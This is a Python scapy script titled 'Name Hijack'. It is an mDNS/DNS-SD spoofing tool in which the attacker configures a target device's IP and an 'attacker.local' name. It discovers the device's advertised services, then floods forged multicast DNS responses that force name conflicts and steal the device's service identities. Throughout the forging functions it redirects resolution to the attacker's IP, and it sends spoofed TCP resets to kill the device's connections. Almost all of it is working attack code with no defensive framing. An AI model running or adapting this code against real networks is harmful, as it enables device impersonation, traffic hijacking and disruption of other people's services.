
#### Name Hijack
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
import netifaces
import scapy.all as sa
import scapy.layers as sl
import copy
import time


############# Variables that needs to be configured by the attacker ##################
device="192.168.1.123"
target="224.0.0.251"
devicev6=""
targetv6=""
interface="wlan0"  
name="attacker.local" # this MUST BE SET TO to the local domain name of the attacker
# To Configure the ip  address of the attacker  go here ==================================
################# VARIABLES ###################                                          ||
                                                                                    #    ||
                                                                                    #    ||
my_ip=netifaces.ifaddresses(interface)[AF_INET][0]['addr']                          #    ||
my_ipv6=netifaces.ifaddresses(interface)[AF_INET6][0]['addr']                        #   ||
my_mac=netifaces.ifaddresses(interface)[AF_LINK][0]['addr']                          #   ||  
src=my_ip  # src=device <<<<===============================================================
services=set()
services2=set()
device_rev=""
forged_packet=""
first=True
second=False
first_packet=None
name=""
resp=False
Records=None
instances=None
current_name=""
instance_names=dict()
trigger_packet=None
create_trigger=True
service_obtained=False
renamed=False
instance_names_rrname=dict()
ask_packet=None
conflict_phase=True
#################################### FUNCTIONS ####################################

def prt(packet):
    global services
    global sniffer
    if sa.DNS in packet and packet[sa.DNS].ancount!=0:
        for i in range(packet[sa.DNS].ancount):
            services.add(packet[sa.DNS].an[i].rdata.decode("utf-8"))
            global device
            global my_rev
            global device_rev
            #device=packet[sa.IP].src
            my_rev=".".join(my_ip.split(".")[::-1])+".in-addr.arpa."
            device_rev=".".join(device.split(".")[::-1])+".in-addr.arpa."

def service_obtaining(packet):
    global current_name
    global instance_names
    global first
    global Records
    global instances
    global trigger_packet
    global service_obtained
    if packet[sa.Ether].src==my_mac:
        return None
    if sa.IP in packet and sa.DNS in packet:
            if current_name=="":
                current_name=find_name(packet)
                #instance_names=find_instance_name(packet)
                instances,Records,trigger_packet=extractrecords(packet)
                instance_names={key:None for key in instances.values()}
                service_obtained=True
                return None
def detecting_renaming(packet):
    global instance_names
    global renamed
    global instances
    if packet[sa.Ether].src==my_mac:
        return None
    if sa.IP in packet and sa.DNS in packet and packet[sa.IP].src==device:
        for q in range(packet[sa.DNS].nscount):
            qname=packet[sa.DNS].ns[q].rrname.decode("utf-8")
            pos=qname.find("._")
            service=qname[pos+1:]
            if packet[sa.DNS].ns[q].type==33 and service in instances.keys():
                qname=packet[sa.DNS].ns[q].rrname.decode("utf-8")
                pos=qname.find("._")
                service=qname[pos+1:]
                instance_name=instances[service]
                if qname!=instance_name:
                    instance_names[instance_name]=qname
                    renamed=True
        for value in instance_names.values():
            if value==None:
                renamed=False
                break
        return None

def detecting_conflictphase(packet):
    global instance_names
    global renamed
    global conflict_phase
    if packet[sa.Ether].src==my_mac:
        return None
    if sa.IP in packet and sa.DNS in packet and packet[sa.IP].src==device:
        if packet[sa.DNS].qdcount!=0:
            conflict_phase=False
            return None
    return None                
            #Answer records
        
def make_resp(service):
    global Records
    global instances
    ar=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
    an=sa.DNSRR(rrname=service.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=instances[service].encode("utf-8"))
    for rtype in Records[instances[service]].keys():
        ar=ar/Records[instances[service]][rtype]
    return an,ar
def find_name(packet):
    for i in range(packet[sa.DNS].ancount):
        if packet[sa.DNS].an[i].type==33:
            return packet[sa.DNS].ar[i].target.decode("utf-8")
    for i in range(packet[sa.DNS].arcount):
        if packet[sa.DNS].ar[i].type==33:
            return packet[sa.DNS].ar[i].target.decode("utf-8")
    for i in range(packet[sa.DNS].nscount):
        if packet[sa.DNS].ns[i].type==33:
            return packet[sa.DNS].ar[i].target.decode("utf-8")
def find_instance_name(packet):
    tmp_set=set()
    for i in range(packet[sa.DNS].ancount):
        if packet[sa.DNS].an[i].type==33:
            tmp=packet[sa.DNS].ar[i].rrname.decode("utf-8")
            tmp_set.add(tmp[:tmp.find("._")])
    for i in range(packet[sa.DNS].arcount):
        if packet[sa.DNS].ar[i].type==33:
            tmp=packet[sa.DNS].ar[i].rrname.decode("utf-8")
            tmp_set.add(tmp[:tmp.find("._")])
    for i in range(packet[sa.DNS].nscount):
        if packet[sa.DNS].ns[i].type==33:
            tmp=packet[sa.DNS].ar[i].rrname.decode("utf-8")
            tmp_set.add(tmp[:tmp.find("._")])
    return {i:None for i in tmp_set}
def change_txt(rdata):
    global name
    global current_name
    tmp_list=[i.decode("utf-8") for i in rdata]
    for i in range(len(tmp_list)):
        p=tmp_list[i].find(current_name)
        if p != -1:
            tmp_list[i]=tmp_list[i][:p]+name+tmp_list[i][p+len(current_name):]
    return [i.encode("utf-8") for i in tmp_list]
def extractrecords(packet):
    global services
    instances={key:None for key in services}
    print(instances)
    global ask_packet
    trigger_packet=sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=1,aa=1,rd=0)
    ask_packet=sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,aa=1,rd=0)
    global name
    global instance_names
    trigger_packet[sa.DNS].an=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
    trigger_packet[sa.DNS].ancount=1
    trigger_packet[sa.DNS].ns=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
    trigger_packet[sa.DNS].nscount=1
    ask_packet[sa.DNS].ns=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
    ask_packet[sa.DNS].nscount=1
    for i in range(packet[sa.DNS].arcount):
        if packet[sa.DNS].ar[i].type==33 or packet[sa.DNS].ar[i].type==33:
            rrname=packet[sa.DNS].ar[i].rrname.decode("utf-8")
            pos=rrname.find("._")
            instances[rrname[pos+1:]]==rrname
    instances={packet[sa.DNS].an[i].rrname.decode("utf-8"):packet[sa.DNS].an[i].rdata.decode("utf-8") for i in range(packet[sa.DNS].ancount)}            
    print(instances)
    Records={service:{typee:None for typee in ["33","16"]} for service in instances.values()}
    for i in range(packet[sa.DNS].arcount):
        if packet[sa.DNS].ar[i].type==33:
            trigger_packet[sa.DNS].an=trigger_packet[sa.DNS].an/sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
            trigger_packet[sa.DNS].ancount+=1
            trigger_packet[sa.DNS].ns=trigger_packet[sa.DNS].ns/sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
            trigger_packet[sa.DNS].nscount+=1
            ask_packet[sa.DNS].ns=trigger_packet[sa.DNS].ns/sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
            ask_packet[sa.DNS].nscount+=1
            global current_name
            current_name=packet[sa.DNS].ar[i].target.decode("utf-8")
            Records[packet[sa.DNS].ar[i].rrname.decode("utf-8")]["33"]=sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
        if packet[sa.DNS].ar[i].type==16 and packet[sa.DNS].ar[i].rrname.decode("utf-8") in Records.keys():
            Records[packet[sa.DNS].ar[i].rrname.decode("utf-8")]["16"]=sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
    trigger_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
    trigger_packet[sa.DNS].arcount=1+len(Records.keys())
    L=list(instances.values())
    ask_packet[sa.DNS].qd=sa.DNSQR(qname=L[0],qtype=255,qclass=32769)
    for i in range(1,len(L)):
        ask_packet[sa.DNS].qd=ask_packet[sa.DNS].qd/sa.DNSQR(qname=L[i],qtype=255,qclass=32769)
    for i in Records.keys():
        trigger_packet[sa.DNS].ar=trigger_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=i.encode("utf-8"),nextname=i.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[33,16])     
    return instances,Records,trigger_packet


def fake(packet):
    global current_name
    global resp
    global services
    global Records
    global instances
    global name
    global interface
    global first
    global first_packet
    global src
    global trigger_packet
    global second
    global instance_names_rrname
    global instance_names
    #print(packet[sa.Ether].src)
    #print(forged_packet)
    #print(packet)
    if sa.IP in packet and packet[sa.IP].src==my_ip :
        return None
    if sa.IP in packet and sa.TCP in packet :
        if packet[sa.IP].src==device and not("R" in packet[sa.TCP].flags):
            sa.send(sa.IP(src=device,dst="192.168.1.114")/sa.TCP(sport=packet[sa.TCP].dport,dport=packet[sa.TCP].sport,flags="RS"),iface=interface)
            print("Connection Killer")
    if sa.IP in packet and sa.DNS in packet :
     #   packet[sa.DNS].show()
        if packet[sa.IP].src==device:
            forged_packet=sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=1,aa=1,rd=0)
            for i in range(packet[sa.DNS].ancount):
                if packet[sa.DNS].an[i].rrname.decode("utf-8").find("_")!=0 and packet[sa.DNS].an[i].rrname.decode("utf-8") in instance_names_rrname.keys():
                    service=packet[sa.DNS].an[i].rrname.decode("utf-8")
                    service=service[service.find("._")+1:]
                    rrname=instance_names_rrname[packet[sa.DNS].an[i].rrname.decode("utf-8")]
                    rrname=rrname.encode("utf-8")
                else:
                    rrname=packet[sa.DNS].an[i].rrname
                if  packet[sa.DNS].an[i].type==1 :
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                 #       forged_packet[sa.DNS].ancount+=1
                if  packet[sa.DNS].an[i].type==28 :
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=name,type=28,rclass=32769,ttl=120,rdata=my_ipv6)
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=name,type=28,rclass=32769,ttl=120,rdata=my_ipv6)
                elif  packet[sa.DNS].an[i].type==33 :
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRRSRV(rrname=rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].an[i].port,target=name.encode("utf-8"))
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRSRV(rrname=rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].an[i].port,target=name.encode("utf-8"))
                #        forged_packet[sa.DNS].ancount+=1
                elif  packet[sa.DNS].an[i].type==12 and packet[sa.DNS].an[i].rrname.decode("utf-8")==device_rev:
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
               #         forged_packet[sa.DNS].ancount+=1
                elif packet[sa.DNS].an[i].type==16:
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].an[i].rdata))
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].an[i].rdata))
                elif packet[sa.DNS].an[i].type==12 and packet[sa.DNS].an[i].rdata.decode("utf-8") in instance_names_rrname.keys():
                    rdata=packet[sa.DNS].an[i].rdata.decode("utf-8")
                    if rdata in instance_names_rrname.keys():
                        rdata=instance_names_rrname[rdata]
                    rdata=rdata.encode("utf-8")
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=rrname,type=12,rclass=32769,ttl=120,rdata=rdata)
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=rrname,type=12,rclass=packet[sa.DNS].an[i].type,ttl=120,rdata=rdata)
              #          forged_packet[sa.DNS].ancount+=1
                elif packet[sa.DNS].an[i].type==47:
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].an[i].typebitmaps):
                        if typebit==1:
                            if forged_packet[sa.DNS].ancount==0:
                                forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
             #                   forged_packet[sa.DNS].ancount+=1
                        elif typebit==12:
                            if forged_packet[sa.DNS].ancount==0:
                                forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                   #             forged_packet[sa.DNS].ancount+=1
                        else:
                            if forged_packet[sa.DNS].ancount==0:
                                forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=packet[sa.DNS].an[i].rrname,nextname=packet[sa.DNS].an[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=packet[sa.DNS].an[i].rrname,nextname=packet[sa.DNS].an[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)
                          #      forged_packet[sa.DNS].ancount+=1                          



            ##Additionnal Records
            for i in range(packet[sa.DNS].arcount):
                if packet[sa.DNS].ar[i].rrname.decode("utf-8").find("_")!=0 and packet[sa.DNS].ar[i].rrname.decode("utf-8") in instance_names_rrname.keys() :
                    service=packet[sa.DNS].ar[i].rrname.decode("utf-8")
                    service=service[service.find("._")+1:]
                    rrname=instance_names_rrname[packet[sa.DNS].ar[i].rrname.decode("utf-8")]
                    rrname=rrname.encode("utf-8")
                else:
                    rrname=packet[sa.DNS].ar[i].rrname
                if  packet[sa.DNS].ar[i].type==1 :
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)

                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
             #           forged_packet[sa.DNS].arcount+=1
                if  packet[sa.DNS].ar[i].type==28 :
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=name,type=28,rclass=32769,ttl=120,rdata=my_ipv6)
                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=name,type=28,rclass=32769,ttl=120,rdata=my_ipv6)
                elif  packet[sa.DNS].ar[i].type==33 :
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRRSRV(rrname=rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
                 #       forged_packet[sa.DNS].arcount+=1
                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRSRV(rrname=rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
              #          forged_packet[sa.DNS].arcount+=1
                elif  packet[sa.DNS].ar[i].type==12 and rrname.decode("utf-8")==device_rev:
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))

                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
             #           forged_packet[sa.DNS].arcount+=1

                elif packet[sa.DNS].ar[i].type==12 and packet[sa.DNS].ar[i].rdata.decode("utf-8") in instance_names_rrname.keys():
                    rdata=packet[sa.DNS].ar[i].rdata
                    if rdata in instance_names_rrname.keys():
                        rdata=instance_names_rrname[rdata]
                    rdata=rdata.encode("utf-8")
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=rrname,type=12,rclass=32769,ttl=120,rdata=rdata)

                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].an/sa.DNSRR(rrname=rrname,type=12,rclass=32769,ttl=120,rdata=rdata)
            #            forged_packet[sa.DNS].arcount+=1
                elif packet[sa.DNS].ar[i].type==16:
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
                elif packet[sa.DNS].ar[i].type==47:
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ar[i].typebitmaps):
                        if typebit==1:
                            if forged_packet[sa.DNS].arcount==0:
                                forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])

                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                       #         forged_packet[sa.DNS].arcount+=1
                            break
                        elif typebit==12:
                            if forged_packet[sa.DNS].arcount==0:
                                forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                          #      forged_packet[sa.DNS].arcount+=1
                            break
                        else:
                            if forged_packet[sa.DNS].arcount==0:
                                forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=packet[sa.DNS].ar[i].rrname,nextname=packet[sa.DNS].ar[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ar[i].typebitmaps)

                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=packet[sa.DNS].ar[i].rrname,nextname=packet[sa.DNS].ar[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ar[i].typebitmaps)
                      #          forged_packet[sa.DNS].arcount+=1  
                            break

            #authority Records
            for i in range(packet[sa.DNS].nscount):
                if packet[sa.DNS].ns[i].rrname.decode("utf-8").find("_")!=0 and packet[sa.DNS].ns[i].rrname.decode("utf-8") in instance_names_rrname.keys():
                    service=packet[sa.DNS].ns[i].rrname.decode("utf-8")
                    service=service[service.find("._")+1:]
                    rrname=instance_names_rrname[packet[sa.DNS].ns[i].rrname.decode("utf-8")]
                    rrname=rrname.encode("utf-8")
                else:
                    rrname=packet[sa.DNS].ns[i].rrname
                if  packet[sa.DNS].ns[i].type==1 :
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                if  packet[sa.DNS].ns[i].type==28 :
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=name,type=28,rclass=32769,ttl=120,rdata=my_ipv6)
                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=name,type=28,rclass=32769,ttl=120,rdata=my_ipv6)
                     #   forged_packet[sa.DNS].ancount+=1
                elif  packet[sa.DNS].ns[i].type==33 :
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRRSRV(rrname=rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ns[i].port,target=name.encode("utf-8"))

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRSRV(rrname=rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ns[i].port,target=name.encode("utf-8"))
                     #   forged_packet[sa.DNS].nscount+=1
                elif  packet[sa.DNS].ns[i].type==12 and rrname.decode("utf-8")==device_rev:
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                   #     forged_packet[sa.DNS].nscount+=1
                elif packet[sa.DNS].ns[i].type==12 and packet[sa.DNS].ns[i].rdata.decode("utf-8") in instance_names_rrname.keys():
                    rdata=packet[sa.DNS].ns[i].rdata
                    if rdata in instance_names_rrname.keys():
                        rdata=instance_names_rrname[rdata]
                    rdata=rdata.encode("utf-8")
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=rrname,type=12,rclass=32769,ttl=120,rdata=rdata)

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=rrname,type=12,rclass=32769,ttl=120,rdata=rdata)
                   #     forged_packet[sa.DNS].nscount+=1
                elif packet[sa.DNS].ns[i].type==16:
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ns[i].rdata))
                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ns[i].rdata))
                elif packet[sa.DNS].ns[i].type==47:
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ns[i].typebitmaps):
                        if typebit==1:
                            if forged_packet[sa.DNS].nscount==0:
                                forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])

                            else:
                                forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                          #      forged_packet[sa.DNS].nscount+=1
                        elif typebit==12:
                            if forged_packet[sa.DNS].nscount==0:
                                forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                            else:
                                forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                        else:
                            if forged_packet[sa.DNS].nscount==0:
                                forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=rrname,nextname=packet[sa.DNS].ns[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)

                            else:
                                forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=rrname,nextname=packet[sa.DNS].ns[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ns[i].typebitmaps)
            forged_packetv4=sa.IP(src=src,dst=target)/forged_packet
            del forged_packetv4.chksum
            sa.send(forged_packetv4,iface=interface)
            return None
        else:
            if packet[sa.DNS].qdcount!=0:
                tmp={i:set() for i in instances.values()}
                forged_packet=sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=1,aa=1,rd=0)
                for q in range(packet[sa.DNS].qdcount):
                    forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=current_name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                    if packet[sa.DNS].qd[q].qname.decode("utf-8")==name:
                       forged_packet[sa.DNS].an=sa.DNSRR(rrname=name,type
                       =1,rclass=32769,ttl=120,rdata=my_ip)
                       forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                    service_of_packet=packet[sa.DNS].qd[q].qname.decode("utf-8")
                    p=service_of_packet.find("_")
                    service_of_packet=service_of_packet[p:]
                    if service_of_packet in services and p==0:
                        if q==0:
                            forged_packet[sa.DNS].an,forged_packet[sa.DNS].ar=make_resp(service_of_packet)
                        else:
                            an,ar=make_resp(service_of_packet)
                            if forged_packet[sa.DNS].an==None:
                                forged_packet[sa.DNS].an=an
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/an
                            if forged_packet[sa.DNS].ar==None:
                                forged_packet[sa.DNS].ar=ar
                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/ar
                    if service_of_packet in services and p!=0:
                        qname=packet[sa.DNS].qd[q].qname.decode("utf-8")
                        if forged_packet[sa.DNS].an==None:
                            if packet[sa.DNS].qd[q].qtype==33:
                                forged_packet[sa.DNS].an=Records[instances[service_of_packet]]["33"]
                            if packet[sa.DNS].qd[q].qtype==16:
                                forged_packet[sa.DNS].an=Records[instances[service_of_packet]]["16"]
                        else:
                            if packet[sa.DNS].qd[q].qtype==33:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/Records[instances[service_of_packet]]["33"]
                            if packet[sa.DNS].qd[q].qtype==16:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/Records[instances[service_of_packet]]["16"]                                                   
                if forged_packet[sa.DNS].ancount+forged_packet[sa.DNS].arcount+forged_packet[sa.DNS].nscount==0:
                    return None
                forged_packetv4=sa.IP(src=src,dst=target)/forged_packet
                sa.send(forged_packetv4,iface=interface)
                sa.send(forged_packetv4,iface=interface)
                
                    


################################################################################## MAIN ####################################################################################
sniffer=sa.AsyncSniffer(filter="src host "+device,prn=prt,iface=interface)
sniffer.start()
sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)),iface=interface)
#sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qdcount=1,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)))
#sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qdcount=1,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)))
time.sleep(0.5)
print("Querying services")
while(len(services)==0):
    sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)),iface=interface)
    time.sleep(1)
sniffer.stop()
print(device)
packet=sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,rd=0)
L=list(services)
print (L)
i=1
packet[sa.DNS].qd=sa.DNSQR(qname=L[0],qtype="PTR",qclass=32769)
for i in range(1,len(L)):
    packet[sa.DNS].qd=packet[sa.DNS].qd/sa.DNSQR(qname=L[i],qtype="PTR",qclass=32769)
print("Obtaining the Services")
sniffer2=sa.AsyncSniffer(prn=service_obtaining,iface=interface)
sniffer2.start()
sa.send(packet)
while(service_obtained==False):
    time.sleep(0.5)
    sa.send(packet,iface=interface)
sniffer2.stop()
print("Services Obtained")
print(instances)
print("trying to rename services")
ask_packet=sa.IP(src=src,dst=target)/ask_packet
trigger_packet=sa.IP(src=src,dst=target)/trigger_packet
sniffer4=sa.AsyncSniffer(prn=detecting_conflictphase,iface=interface)
sniffer4.start()
while(conflict_phase):
    sa.send(trigger_packet,iface=interface)
    time.sleep(1)
sniffer4.stop()
sniffer3=sa.AsyncSniffer(prn=detecting_renaming,iface=interface)
sniffer3.start()
sa.send(trigger_packet,iface=interface)
time.sleep(1)
while(not(renamed)):
    sa.send(trigger_packet,iface=interface)
